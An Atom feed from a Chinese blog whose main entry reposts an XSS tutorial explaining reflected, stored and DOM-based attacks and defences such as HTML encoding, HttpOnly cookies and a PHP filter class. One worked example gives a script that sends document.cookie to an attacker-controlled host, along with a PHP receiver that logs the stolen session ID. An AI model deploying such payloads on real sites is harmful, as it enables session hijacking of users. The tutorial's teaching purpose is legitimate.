<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Danboard</title>
  
  <subtitle>踮起脚尖，另一种高度</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.danboard.me/"/>
  <updated>2018-10-01T10:26:54.006Z</updated>
  <id>http://www.danboard.me/</id>
  
  <author>
    <name>Danboard</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS跨站脚本攻击</title>
    <link href="http://www.danboard.me/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    <id>http://www.danboard.me/XSS跨站脚本攻击/</id>
    <published>2018-10-01T07:04:32.000Z</published>
    <updated>2018-10-01T10:26:54.006Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-10-1/33668888.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-10-1/33668888.jpg"></p><a id="more"></a><p>【转】<a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label0" target="_blank" rel="noopener">https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_label0</a></p><h2 id="1、简介"><a class="header-anchor" href="#1、简介" aria-hidden="true">¶</a> 1、简介</h2><p>跨站脚本（cross site script）为了避免与样式css混淆，所以简称为XSS。</p><p>XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。那么什么是XSS呢？</p><p>XSS是指恶意攻击者<strong>利用</strong>网站没有对用户提交数据进行转义处理或者过滤不足的<strong>缺点</strong>，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。</p><p>从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</p><p><strong>XSS攻击的危害包括：</strong></p><p>1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</p><p>2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</p><p>3、盗窃企业重要的具有商业价值的资料</p><p>4、非法转账</p><p>5、强制发送电子邮件</p><p>6、网站挂马</p><p>7、控制受害者机器向其它网站发起攻击</p><h2 id="2、原因解析"><a class="header-anchor" href="#2、原因解析" aria-hidden="true">¶</a> 2、原因解析</h2><p><strong>主要原因</strong>：过于信任客户端提交的数据！</p><p><strong>解决办法</strong>：不信任任何客户端提交的数据，只要是客户端提交的数据就应该先进行相应的过滤处理然后方可进行下一步的操作。</p><p><strong>进一步分析细节</strong>：客户端提交的数据本来就是应用所需要的，但是恶意攻击者利用网站对客户端提交数据的信任，在数据中插入一些符号以及javascript代码，那么这些数据将会成为应用代码中的一部分了。那么攻击者就可以肆无忌惮地展开攻击啦。</p><p>因此我们绝<strong>不可以信任</strong>任何客户端提交的数据！！！</p><h2 id="3、XSS攻击分类"><a class="header-anchor" href="#3、XSS攻击分类" aria-hidden="true">¶</a> 3、XSS攻击分类</h2><p>【了解即可，不必细究，XSS根源就是没完全过滤客户端提交的数据】</p><h3 id="3.1、反射型xss攻击"><a class="header-anchor" href="#3.1、反射型xss攻击" aria-hidden="true">¶</a> 3.1、反射型xss攻击</h3><p>又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。</p><p><strong>简单例子</strong></p><p><strong>正常发送消息：</strong></p><p><code>http://www.test.com/message.php?send=Hello,World！</code></p><p>接收者将会接收信息并显示Hello,Word</p><p>非正常发送消息：</p><p><code>http://www.test.com/message.php?send=&lt;script&gt;alert(‘foolish!’)&lt;/script&gt;！</code></p><p>接收者接收消息显示的时候将会弹出警告窗口</p><h3 id="3.2、存贮型xss攻击"><a class="header-anchor" href="#3.2、存贮型xss攻击" aria-hidden="true">¶</a> 3.2、存贮型xss攻击</h3><p>又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器,脚本执行。持久的XSS相比非持久性XSS攻击危害性更大,因为每当用户打开页面，查看内容时脚本将自动执行。谷歌的orkut曾经就遭受到XSS。</p><p><strong>简单例子：</strong></p><p>从名字就可了解到存储型XSS攻击就是将攻击代码存入数据库中，然后客户端打开时就执行这些攻击代码。例如留言板</p><p>留言板表单中的表单域：<code>&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;这里是用户填写的数据&quot;&gt;</code></p><p><strong>正常操作：</strong></p><p>用户是提交相应留言信息；将数据存储到数据库；其他用户访问留言板，应用去数据并显示。</p><p><strong>非正常操作：</strong></p><p>攻击者在value填写<code>&lt;script&gt;alert(‘foolish!’)&lt;/script&gt;</code>【或者html其他标签（破坏样式。。。）、一段攻击型代码】；</p><p>将数据存储到数据库中；</p><p>其他用户取出数据显示的时候，将会执行这些攻击性代码</p><h3 id="3.3、DOMBasedXSS（基于dom的跨站点脚本攻击）"><a class="header-anchor" href="#3.3、DOMBasedXSS（基于dom的跨站点脚本攻击）" aria-hidden="true">¶</a> 3.3、DOMBasedXSS（基于dom的跨站点脚本攻击）</h3><p>基于DOM的XSS有时也称为type0XSS。当用户能够通过交互修改浏览器页面中的DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞，从效果上来说它也是反射型XSS。</p><p>通过修改页面的DOM节点形成的XSS，称之为DOMBasedXSS。</p><p>前提是易受攻击的网站有一个HTML页面采用不安全的方式从document.location 或document.URL 或 document.referrer获取数据（或者任何其他攻击者可以修改的对象）。</p><p><strong>简单例子</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Welcome!<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span><br><span class="line">Hi</span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var pos=document.URL.indexOf("name=")+5;</span></span><br><span class="line"><span class="undefined">document.write(document.URL.substring(pos,document.URL.length));</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BR</span>&gt;</span></span><br><span class="line">Welcome to our system</span><br><span class="line">…</span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个例子是个欢迎页面，name是截取URL中get过来的name参数</p><p><strong>正常操作：</strong></p><p><code>http://www.vulnerable.site/welcome.html?name=Joe</code></p><p><strong>非正常操作：</strong></p><p><code>http://www.vulnerable.site/welcome.html?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p>将产生xss条件。让我们看看为什么：受害者的浏览器接收到这个链接，发送HTTP请求到<code>www.vulnerable.site</code>并且接受到上面的HTML页。受害者的浏览器开始解析这个HTML为DOM，DOM包含一个对象叫document，document里面有个URL属性，这个属性里填充着当前页面的URL。当解析器到达javascript代码，它会执行它并且修改你的HTML页面。倘若代码中引用了document.URL，那么，这部分字符串将会在解析时嵌入到HTML中，然后立即解析，同时，javascript代码会找到(alert(…))并且在同一个页面执行它，这就产生了xss的条件。</p><p><strong>注意:</strong></p><ol><li>恶意程序脚本在任何时候不会嵌入到处于自然状态下的HTML页面（这和其他种类的xss不太一样）。</li></ol><p>2.这个攻击只有在浏览器没有修改URL字符时起作用。 当url不是直接在地址栏输入，Mozilla.会自动转换在document.URL中字符&lt;和&gt;（转化为%3C 和 %3E），因此在就不会受到上面示例那样的攻击了，在IE6下没有转换&lt;和&gt;，因此他很容易受到攻击。</p><p>当然，直接嵌入到HTML只是攻击的一个挂载点，有很多脚本不需要依赖&lt;和&gt;漏洞，因此Mozilla通常也是无法阻止这些攻击的。</p><p>【这段出自：<a href="http://www.oschina.net/translate/dom-based-xss-of-third-kind" target="_blank" rel="noopener">http://www.oschina.net/translate/dom-based-xss-of-third-kind</a>】</p><h2 id="4、XSS攻击实例分析"><a class="header-anchor" href="#4、XSS攻击实例分析" aria-hidden="true">¶</a> 4、XSS攻击实例分析</h2><p><strong>例1、简单XSS攻击</strong></p><p>留言类，简单注入javascript</p><p>有个表单域：<code>&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;这里是用户填写的数据&quot;&gt;</code></p><ol><li><p>假若用户填写数据为：<code>&lt;script&gt;alert('foolish!')&lt;/script&gt;</code>（或者<code>&lt;script type=&quot;text/javascript&quot; src=&quot;./xss.js&quot;&gt;&lt;/script&gt;</code>）</p></li><li><p>提交后将会弹出一个foolish警告窗口，接着将数据存入数据库</p></li><li><p>等到别的客户端请求这个留言的时候，将数据取出显示留言时将执行攻击代码，将会显示一个foolish警告窗口。</p></li></ol><p>【将数据改成html标签进行攻击，则会将原本的样式打乱。。。。。。。。】</p><p><strong>例2、盗取cookie</strong></p><ol><li><p>网站所在域名为<code>www.test88.com</code>、攻击者控制的主机<code>www.linuxtest.com</code></p></li><li><p>test88.com中的表单，xss.html</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>xss攻击<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./test99.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">留言：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">'提交'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span>留言记录：<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>恶意攻击者插入相应代码</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var Str=document.cookie;               //获取cookie</span></span><br><span class="line"><span class="undefined">    var a =document.createElement('a');        //创建a标签</span></span><br><span class="line"><span class="undefined">    a.href='http://www.linuxtest.com/test2.php?'+Str;   //攻击者主机</span></span><br><span class="line"><span class="xml">    a.innerHTML="<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'./aa.jpg'</span>&gt;</span>";        //掩护图片</span></span><br><span class="line"><span class="undefined">    document.body.appendChild(a);              //将标签添加到页面中</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li><p>数据（攻击代码）插入数据库</p></li><li><p>攻击者控制的主机中设置接收盗取的cookie</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf8"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"你的PHPSESSID被盗啦"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r($_GET);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">$cookie=$_GET[<span class="string">'PHPSESSID'</span>];</span><br><span class="line">file_put_contents(<span class="string">'./xss.txt'</span>, $cookie);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>开始模拟测试</strong></p><ol><li>test88.com中设置生成sessionID代码</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'xss'</span>]=<span class="string">'xssssss'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r($_SESSION);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;<span class="keyword">die</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>客户端访问上面代码并生成自己的sessionID</li></ol><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-10-1/32257283.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-10-1/32257283.jpg"></p><ol start="3"><li><p>客户端访问xss.html</p><p>下面为模拟被攻击后取出数据的xss.html代码（显示数据）</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>xss攻击<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./test99.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    留言：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">'提交'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span>留言记录：<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var Str=document.cookie;               //获取cookie</span></span><br><span class="line"><span class="undefined">    var a =document.createElement('a');        //创建a标签</span></span><br><span class="line"><span class="undefined">    a.href='http://www.linuxtest.com/test2.php?'+Str;   //攻击者主机</span></span><br><span class="line"><span class="xml">    a.innerHTML="<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'./aa.jpg'</span>&gt;</span>";        //掩护图片</span></span><br><span class="line"><span class="undefined">    document.body.appendChild(a);              //将标签添加到页面中</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-10-1/89311384.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-10-1/89311384.jpg"></p><p>4、客户端不小心点击到图片，sessionID将被盗</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-10-1/61917039.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-10-1/61917039.jpg"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> vi xss.txt</span><br></pre></td></tr></table></figure><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-10-1/7212424.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-10-1/7212424.jpg"></p><p>【当然这仅仅只是一个很简单的攻击，只要将数据过滤就可以避免这个攻击了，这里只是让大家了解XSS是如何进行攻击的。】</p><h2 id="5、XSS漏洞修复"><a class="header-anchor" href="#5、XSS漏洞修复" aria-hidden="true">¶</a> 5、XSS漏洞修复</h2><p>从上面XSS实例以及之前文章的介绍我们知道XSS漏洞的起因就是没有对用户提交的数据进行严格的过滤处理。因此在思考解决XSS漏洞的时候，我们应该重点把握如何才能更好的将用户提交的数据进行安全过滤。</p><h3 id="5.1、html实体"><a class="header-anchor" href="#5.1、html实体" aria-hidden="true">¶</a> 5.1、html实体</h3><p>什么是html实体？</p><p>在html中有些字符，像(&lt;)这类的，对HTML(标准通用标记语言下的一个应用)来说是有特殊意义的，所以这些字符是不允许在文本中使用的。要在HTML中显示(&lt;)这个字符，我们就必须使用实体字符。</p><p>html实体的存在是导致XSS漏洞的主要原因之一。</p><p>因此我们需要将这些实体全部转换为相应的实体编号。</p><table><thead><tr><th>显示结果</th><th>描述</th><th>实体名称</th></tr></thead><tbody><tr><td></td><td>空格</td><td> </td></tr><tr><td>&lt;</td><td>小于号</td><td>&lt;</td></tr><tr><td>&gt;</td><td>大于号</td><td>&gt;</td></tr><tr><td>&amp;</td><td>和号</td><td>&amp;</td></tr><tr><td>&quot;</td><td>引号</td><td>&quot;</td></tr><tr><td>’</td><td>撇号</td><td>' (IE不支持)</td></tr></tbody></table><h3 id="5.2、HTML Encode"><a class="header-anchor" href="#5.2、HTML Encode" aria-hidden="true">¶</a> 5.2、HTML Encode</h3><p>用户将数据提交上来的时候进行HTML编码，将相应的符号转换为实体名称再进行下一步的处理。</p><p>在PHP中已经存在这样子功能的函数，即是htmlentities($str)函数。</p><p>与之相反的就是html_entity_decode($str)函数，它将实体名称转换为相应的符号。</p><h3 id="5.3、修复漏洞方针"><a class="header-anchor" href="#5.3、修复漏洞方针" aria-hidden="true">¶</a> 5.3、修复漏洞方针</h3><p>【不相应用户提交的数据，<strong>过滤过滤过滤！</strong>】</p><p>1、将重要的cookie标记为http only, 这样的话Javascript 中的document.cookie语句就不能获取到cookie了.</p><p>2、表单数据规定值的类型，例如：年龄应为只能为int、name只能为字母数字组合。。。。</p><p>4、对数据进行Html Encode 处理</p><p>5、过滤或移除特殊的Html标签， 例如: <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code> , <code>&amp;lt;</code>for &lt;, <code>&amp;gt;</code> for &gt;, <code>&amp;quot;</code> for &quot;</p><p>6、过滤JavaScript 事件的标签。例如 “onclick=”, “onfocus” 等等。</p><p>【特别注意：】</p><p>在有些应用中是允许html标签出现的，甚至是javascript代码出现。因此我们在过滤数据的时候需要仔细分析哪些数据是有特殊要求（例如输出需要html代码、javascript代码拼接、或者此表单直接允许使用等等），然后区别处理！</p><h3 id="5.4、PHP中的相应函数"><a class="header-anchor" href="#5.4、PHP中的相应函数" aria-hidden="true">¶</a> 5.4、PHP中的相应函数</h3><p>【详细看PHP手册】</p><p>这里可能不全，想了解更多的看手册。</p><blockquote><p>strip_tags($str, [允许标签]) #从字符串中去除 HTML 和 PHP 标记</p><p>htmlentities($str)函数 #转义html实体</p><p>html_entity_decode($str)函数 #反转义html实体</p><p>addcslashes($str, ‘字符’)函数 #给某些字符加上反斜杠</p><p>stripcslashes($str)函数 #去掉反斜杠</p><p>addslashes ($str )函数 #单引号、双引号、反斜线与 NULL加反斜杠</p><p>stripslashes($str)函数 #去掉反斜杠</p><p>htmlspecialchars() #特殊字符转换为HTML实体</p><p>htmlspecialchars_decode() #将特殊的 HTML 实体转换回普通字符</p></blockquote><h3 id="5.5、数据过滤类"><a class="header-anchor" href="#5.5、数据过滤类" aria-hidden="true">¶</a> 5.5、数据过滤类</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XSS</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@desc</span> 过滤数据</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> $data string|array 输入数据</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> $low  bool      是否采用更为严格的过滤</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> 返回过滤的数据</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clean_xss</span><span class="params">($data, $low = False)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">#字符串过滤</span></span><br><span class="line">       <span class="keyword">if</span> (! is_array ( $data ))</span><br><span class="line">       &#123;</span><br><span class="line">           $data = trim ( $data );              <span class="comment">#字符两边的处理</span></span><br><span class="line">           $data = strip_tags ( $data );        <span class="comment">#从字符串中去除 HTML 和 PHP 标记</span></span><br><span class="line">           $data = htmlspecialchars ( $data );  <span class="comment">#特殊字符转换为HTML实体</span></span><br><span class="line">           <span class="keyword">if</span> ($low)</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">return</span> $data;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">#匹配换空格</span></span><br><span class="line">           $data = str_replace ( <span class="keyword">array</span> (<span class="string">'"'</span>, <span class="string">"\\"</span>, <span class="string">"'"</span>, <span class="string">"/"</span>, <span class="string">".."</span>, <span class="string">"../"</span>, <span class="string">"./"</span>, <span class="string">"//"</span> ), <span class="string">''</span>, $data );</span><br><span class="line">           $no = <span class="string">'/%0[0-8bcef]/'</span>; </span><br><span class="line">           $data = preg_replace ( $no, <span class="string">''</span>, $data );</span><br><span class="line">           $no = <span class="string">'/%1[0-9a-f]/'</span>;</span><br><span class="line">           $data = preg_replace ( $no, <span class="string">''</span>, $data );</span><br><span class="line">           $no = <span class="string">'/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S'</span>;</span><br><span class="line">           $data = preg_replace ( $no, <span class="string">''</span>, $data );</span><br><span class="line">           <span class="keyword">return</span> $data;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">#数组过滤</span></span><br><span class="line">       $arr=<span class="keyword">array</span>();</span><br><span class="line">       <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $k =&gt; $v) </span><br><span class="line">       &#123;</span><br><span class="line">           $temp=<span class="keyword">$this</span>-&gt;clean_xss($v);</span><br><span class="line">           $arr[$k]=$temp;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $arr;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#测试测试</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'xss'</span>]=<span class="string">'xssss'</span>;</span><br><span class="line">$xss=<span class="keyword">new</span> XSS();</span><br><span class="line"><span class="comment">#测试字符串</span></span><br><span class="line">$str = <span class="string">"&lt;script&gt;alert(document.cookie)&lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line">$str2=$xss-&gt;clean_xss($str);</span><br><span class="line"><span class="keyword">echo</span> $str2;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;"</span>;</span><br><span class="line"><span class="comment">#测试数组</span></span><br><span class="line">$arr=<span class="keyword">array</span>(<span class="string">"&lt;script&gt;alert(document.cookie)&lt;/script&gt;"</span>,<span class="string">"&lt;script&gt;alert(document.cookie)&lt;/script&gt;"</span>,<span class="string">"&lt;script&gt;alert(document.cookie)&lt;/script&gt;"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r($arr);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">$arr2=$xss-&gt;clean_xss($arr);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">print_r($arr2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;<span class="keyword">die</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-10-1/33668888.jpg&quot; alt=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-10-1/33668888.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="http://www.danboard.me/categories/JavaScript/"/>
    
    
      <category term="js, php" scheme="http://www.danboard.me/tags/js-php/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode 11~20</title>
    <link href="http://www.danboard.me/LeetCode-11-20/"/>
    <id>http://www.danboard.me/LeetCode-11-20/</id>
    <published>2018-09-30T05:11:29.000Z</published>
    <updated>2018-09-30T14:46:31.406Z</updated>
    
